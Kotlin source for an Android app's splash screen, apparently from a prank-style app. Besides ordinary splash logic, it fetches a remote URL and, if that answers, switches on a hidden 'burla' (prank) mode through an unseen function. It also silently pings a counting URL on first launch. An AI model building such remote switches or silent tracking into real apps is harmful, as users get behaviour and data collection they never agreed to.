package com.hackit0x11.autoreddi.to

import android.app.Activity
import android.content.*
import android.os.Bundle
import android.os.Handler
import android.widget.ProgressBar
import android.util.Log

/**
 * SplashScreen activity: shows a splash, checks remote status, and launches main activity.
 * 
 * Update the commented sections [CHANGE HERE] if you adjust resources, logic, or actions.
 */
class SplashScreen : Activity() {

    // Randomized splash time between 2 and 5 seconds. [CHANGE HERE] to adjust splash duration logic.
    private var splashTime: Int = (2_000..5_000).random()

    // URLs loaded from resources. [CHANGE HERE] if resource names change.
    var countUrl: String = ""
    var urlABurla: String = ""

    // ProgressBar shown during splash. [CHANGE HERE] if you rename/remove the ProgressBar in layout.
    private lateinit var progressBar: ProgressBar

    // SharedPreferences for persistent state. [CHANGE HERE] if you change storage keys or logic.
    private lateinit var prefs: SharedPreferences
    private lateinit var prefsEditor: SharedPreferences.Editor

    // Action string for broadcast close intent. [CHANGE HERE] if you want to change the broadcast action.
    companion object {
        const val ACTION_CLOSE = "canigonfi.ACTION_CLOSE"
    }

    // BroadcastReceiver to listen for finish signals. [CHANGE HERE] if broadcast or animation changes.
    private var firstReceiver: BroadcastReceiver? = null

    // Helper: checks if this is the first app run. [CHANGE HERE] if you change the first-run logic.
    private fun isFirstRun(): Boolean = prefs.getBoolean("first_run", true)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // [CHANGE HERE] if you update the splash layout resource.
        setContentView(R.layout.splashscreen)

        // Load URLs from resources. [CHANGE HERE] if resource names change.
        countUrl = resources.getString(R.string.contami)
        urlABurla = resources.getString(R.string.burlami)

        // Setup SharedPreferences. [CHANGE HERE] if you change storage name or keys.
        prefs = getSharedPreferences("STORAGE", Context.MODE_PRIVATE)
        prefsEditor = prefs.edit()

        // Setup ProgressBar. [CHANGE HERE] if ProgressBar id changes in layout.
        progressBar = findViewById(R.id.progressBar)
        progressBar.isIndeterminate = true

        // Register receiver for closing the splash. [CHANGE HERE] if broadcast action or transition changes.
        val filter = IntentFilter(ACTION_CLOSE)
        firstReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                Log.e("FirstReceiver", "FirstReceiver triggered")
                if (intent.action == ACTION_CLOSE) {
                    finish()
                    overridePendingTransition(R.anim.fade_in, R.anim.fade_out)
                }
            }
        }
        registerReceiver(firstReceiver, filter)

        // Background thread: check remote "burla" status.
        Thread {
            try {
                val response = utility.getHttpResponse(urlABurla)
                Log.w("8=========>", response ?: "No")
                if (response != null) {
                    // "Burla mode" ON
                    prefsEditor.putBoolean("burla", true).commit()
                    prefsEditor.putBoolean("pissing", true).commit()
                    utility.dodaburla(this@SplashScreen, this@SplashScreen)
                    splashTime = 0 // Skip splash if in "burla" mode
                } else {
                    prefsEditor.putBoolean("burla", false).commit()
                }
            } catch (_: Exception) { /* Ignore */ }
        }.start()

        // First run: show info dialog and mark as no longer first run.
        if (isFirstRun()) {
            // [CHANGE HERE] if you update the about dialog layout or string resources.
            utility.setDialog(
                this@SplashScreen,
                R.layout.alpha,
                R.string.AboutTitle,
                R.id.aboutexit,
                R.string.AboutText
            )
            // Track/notify first launch remotely.
            Thread { utility.getHttpResponse(countUrl) }.start()
            prefsEditor.putBoolean("first_run", false).commit()
        }

        // If not in "burla" mode, start the service. [CHANGE HERE] if service name/logic changes.
        if (!prefs.getBoolean("burla", false)) {
            val serviceIntent = Intent(this, Servodeiservideiservi::class.java)
            startService(serviceIntent)
        }

        // After splashTime ms, launch the main activity.
        Handler().postDelayed({
            val intent = Intent(this, AutoAct::class.java)
            startActivity(intent)
            // Uncomment below to auto-finish splash and animate.
            // finish()
            // overridePendingTransition(R.anim.fade_in, R.anim.fade_out)
        }, splashTime)

        // Dummy handler to keep splash alive for splashTime ms.
        Handler().postDelayed({ }, splashTime)
    }

    // Handle back button: finish splash. [CHANGE HERE] to adjust back behavior.
    override fun onBackPressed() {
        finish()
        super.onBackPressed()
    }

    // Unregister receiver on stop to prevent leaks. [CHANGE HERE] if receiver logic changes.
    override fun onStop() {
        firstReceiver?.let { unregisterReceiver(it) }
        super.onStop()
    }
}
